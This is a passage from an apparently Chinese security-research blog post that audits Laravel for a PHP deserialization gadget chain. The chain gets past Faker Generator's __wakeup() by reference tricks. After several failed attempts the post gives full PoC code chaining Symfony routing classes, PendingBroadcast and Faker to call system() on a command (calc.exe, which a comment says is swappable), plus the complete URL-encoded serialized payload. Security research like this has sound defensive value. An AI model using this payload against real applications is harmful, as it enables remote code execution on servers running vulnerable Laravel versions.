  1. 使得被置空的`$formatters`变量，与某个类中的变量`$bypass`成为`R`的指针引用关系。
  2. 当`$formatters`被置空的时候，通过改变`$bypass`的值，即可对`$formatters`的值进行修改
  3. 在执行`getFormatter()`之前完成上述操作，就可以成功对冲那个`__wakeup()`函数了。
也就是说，最好能够找到一个赋值语句，且被赋值的语句是类中的成员属性。类似：
    $this->a = xxx
这样，就可以进行序列化，然后直接修改`$a`的引用方式，使得其引用`$formatters`，然后对其进行重新赋值，达成绕过。
这里想要达成在`__wakeup()`之后重新赋值的操作，正常的想法，就是通过反序列化后，触发某个类中的`__wakeup()`方法来进行赋值，或是在销毁类的时候，调用其中的`__destruct()`方法，来进行操作。
这里全局搜索一下`__wakeup()`方法：
### 尝试1：
每一个都看了一下，感觉上`/vendor/laravel/framework/src/Illuminate/Queue/SerializesModels.php`比较有可能性：
    public function __wakeup()
        {
            foreach ((new ReflectionClass($this))->getProperties() as $property) {
                $property->setValue($this, $this->getRestoredPropertyValue(
                    $this->getPropertyValue($property)
                ));
            }
        }
这里使用了一个foreach()函数进行了遍历，这里可以看到，使用了PHP中的反射类`ReflectionClass`，这个类的作用是通过类名来获取类的成员属性和方法信息。这里的参数是`$this`，也就是获取对象中的成员属性，然后会作为`ReflectionProperty`类的数组返回其中的成员。
通过foreach()函数，将值依次赋给`$property`。
然后调用了`setValue()`方法，这个是`ReflectionProperty`中自带的方法，用于对成员属性重新赋值，这里可以看到函数定义：
这里跟进一下`getRestoredPropertyValue()`方法，
第一个if会直接判断传入的参数是不是`ModelIdentifier`类中的成员属性，如果不是就会直接返回原值，到这里就够了，可以直接看下一步。
跟进一下`getPropertyValue()`
这里可以看到，就是直接调用了`setAccessible()`函数，保证这里可以访问保护或者是私有的属性，然后返回值。
本来这里应该是一个可以利用的点，但是因为这个类中没有定义成员变量，无法利用`setValue()`这一段。算是失败了。
### 尝试2：
因为上面看过了 **wakeup()函数暂时是没有可以利用点，这里重新看一下`** destruct()`
看看能不能找到什么可以利用的点。
这里找到了一个疑似可以利用的地方：
    \vendor\sebastian\recursion-context\src\Context.php
这里可以看到，作为私有属性定义的`$arrays`变量，只有通过`__construct()`方法进行赋值，或者是调用`addArray()`函数，进行属性的添加。因此我们可以对这个数组的内容进行操作。
但是，虽然可以对数组进行操作，但是我们不能对`$array`变量进行操作操作，因此不能使它对`$formatters`变量进行引用，也就不能利用了。
如果这里对`$array`进行了成员属性的定义，就是一个可以利用的点。
### 尝试3：
这里还有一个疑似可以利用的地方：
    \vendor\symfony\routing\Loader\Configurator\CollectionConfigurator.php
这里可以看见成员属性`$this->collection`被新建为了`RouteCollection`类的对象，然后在`__destruct()`中，进行了方法调用。
这里跟进一下`addPrefix`方法，这里看名字应该是某个添加什么东西的方法。
    public function addPrefix($prefix, array $defaults = [], array $requirements = [])
        {
            $prefix = trim(trim($prefix), '/');
            if ('' === $prefix) {
                return;
            }
            foreach ($this->routes as $route) {
                $route->setPath('/'.$prefix.$route->getPath());
                $route->addDefaults($defaults);
                $route->addRequirements($requirements);
            }
        }
这里对$prefix参数进行了处理，将字符串左右的空白制表等符号，还有`/`去除，如果去除完了之后是空，则直接返回。如果不是，则对`RouteCollection`中的成员属性进行foreach()遍历。
这里跟进一下`setPath()`
这里可以看到`$this->path`，这里有一个外面的`/`，没办法去除，绕不过。不然可以尝试去修改`$formatters`
接下来看看`addDefaults`方法。
其中`$this->defaults`的值是我们可以控制的，如果对传入的参数我们可以完全控制的话，`$name`和`$default`也都是我们可以控制的内容，这里就算是打通了。
也就是通过数组的相互引用来修改`$formatters`的值，具体操作思路如下：
    //思路：
    a = array("a","b");
            $this->array = array(1,2,3,4,5);
        }
        public function __wakeup(){
            var_dump($this->a);
            echo "\n";
            var_dump($this->default);
            foreach($this->array as $name=>$value){
                $this->default[$name] = $value;
                var_dump($this->default[$name]);
            }
            var_dump($this->a);
        }
    }
    $demo = new Demo();
    echo serialize($demo);
    unserialize('O:4:"Demo":3:{s:1:"a";a:2:{i:0;s:1:"a";i:1;s:1:"b";}s:7:"default";R:2;s:5:"array";a:5:{i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:4;i:4;i:5;}}');
    //注意看default后面那个R:2，这里是引用了$a的值。
输出结果如上，可以看到$a的值，从`["a","b"]`，变成了`[1,2,3,4,5]`这里可以实现修改。同样的，对于`$formatters`也可以进行这样的操作。
回头看一下`$defaults`值的获取。
麻了，是不能传递参数的一个形参，这里用不了。
下面的`addRequirements()`函数也是同理，都是不能传递参数的一个形参，无法调用。
再回头看一下`addCollection()`这部分：
这部分可以看到调用了一个函数，直接跟进一下。这个是`RouteCollection`类中的方法。
这里可以看到用的是传入的类中的参数，调用了其中的all()函数，这里跟进一下：
可以看到这里关于`$routes`变量的赋值，是我们可以操控的。
这里这个函数的foreach()部分，和之前分析的基本一样，因此这里应该是可以打通的。
### 构造POC：
用之前的POC来进行修改：
这里注意要利用`__wakeup()`和`__destruct()`执行的顺序差。
    parent = new \Symfony\Component\Routing\RouteCollection();
                $this->collection = new \Symfony\Component\Routing\RouteCollection();
                $this->route = new \Symfony\Component\Routing\Route();
                $this->parentConfigurator = new \Illuminate\Broadcasting\PendingBroadcast();
            }
        }
    }
    namespace Symfony\Component\Routing{
        use Traversable;
        class RouteCollection implements \IteratorAggregate, \Countable{
            public function __construct(){
                $this->routes = array("dispatch"=>"system");
            }
            public function getIterator()
            {
                // TODO: Implement getIterator() method.
            }
            public function count()
            {
                // TODO: Implement count() method.
            }
        }
        class Route implements \Serializable
        {
            public function __construct()
            {
                $this->path = '////';  //这里被trim了之后会直接为空，进入return，主要是为了方便
            }
            public function serialize()
            {
                return serialize([
                    'path' => $this->path,
                    'host' => $this->host,
                    'defaults' => $this->defaults,
                    'requirements' => $this->requirements,
                    'options' => $this->options,
                    'schemes' => $this->schemes,
                    'methods' => $this->methods,
                    'condition' => $this->condition,
                    'compiled' => $this->compiled,
                ]);
            }
            public function unserialize($data)
            {
                // TODO: Implement unserialize() method.
            }
        }
    }
    namespace Illuminate\Broadcasting{
        class  PendingBroadcast{
            protected $events;
            protected $event;
            function __construct(){
                $this->events = new \Faker\Generator();
                $this->event = 'calc.exe'; //执行的命令在这里，修改了就可以
            }
        }
    }
    namespace Faker{
        class Generator{
            protected $formatters;
            protected $providers;
            public function __construct()
            {
                $this->formatters = ['useless'];
            }
        }
    }
    namespace {
        $POC = new Symfony\Component\Routing\Loader\Configurator\CollectionConfigurator();
        echo urlencode(str_replace('363','333',str_replace('a:1:{i:0;s:7:"useless";}', 'R:3;', serialize($POC))));
    }
（有点丑，sorry)
然后输出的结果是：
### Payload:
    O%3A68%3A%22Symfony%5CComponent%5CRouting%5CLoader%5CConfigurator%5CCollectionConfigurator%22%3A4%3A%7Bs%3A6%3A%22parent%22%3BO%3A41%3A%22Symfony%5CComponent%5CRouting%5CRouteCollection%22%3A1%3A%7Bs%3A6%3A%22routes%22%3Ba%3A1%3A%7Bs%3A8%3A%22dispatch%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A10%3A%22collection%22%3BO%3A41%3A%22Symfony%5CComponent%5CRouting%5CRouteCollection%22%3A1%3A%7Bs%3A6%3A%22routes%22%3Ba%3A1%3A%7Bs%3A8%3A%22dispatch%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A5%3A%22route%22%3BC%3A31%3A%22Symfony%5CComponent%5CRouting%5CRoute%22%3A163%3A%7Ba%3A9%3A%7Bs%3A4%3A%22path%22%3Bs%3A4%3A%22%2F%2F%2F%2F%22%3Bs%3A4%3A%22host%22%3BN%3Bs%3A8%3A%22defaults%22%3BN%3Bs%3A12%3A%22requirements%22%3BN%3Bs%3A7%3A%22options%22%3BN%3Bs%3A7%3A%22schemes%22%3BN%3Bs%3A7%3A%22methods%22%3BN%3Bs%3A9%3A%22condition%22%3BN%3Bs%3A8%3A%22compiled%22%3BN%3B%7D%7Ds%3A18%3A%22parentConfigurator%22%3BO%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A15%3A%22Faker%5CGenerator%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00formatters%22%3BR%3A3%3Bs%3A12%3A%22%00%2A%00providers%22%3BN%3B%7Ds%3A8%3A%22%00%2A%00event%22%3Bs%3A8%3A%22calc.exe%22%3B%7D%7D
演示：
到这里就算是告一段落了。
## 利用链梳理：
## 总结：
这条链子主要是因为inHann师傅在他的研究里给出的是一个依赖里的链子，所以我想看看在Laravel里面有没有可以不通过依赖直接利用的那个`__wakeup()`的地方，然后捣腾出来的。之前看了一些博客，说这里被`__wakeup()`的置空给堵死了，但其实还是有办法利用的。
（其实感觉有点属于屠龙之技，没什么用，主要还是给师傅们提供一个思路吧hhh，希望师傅们轻喷。）
这一次审计主要学到的还是这个对冲的操作在POP链中的利用方式，这个做法还是很灵活的。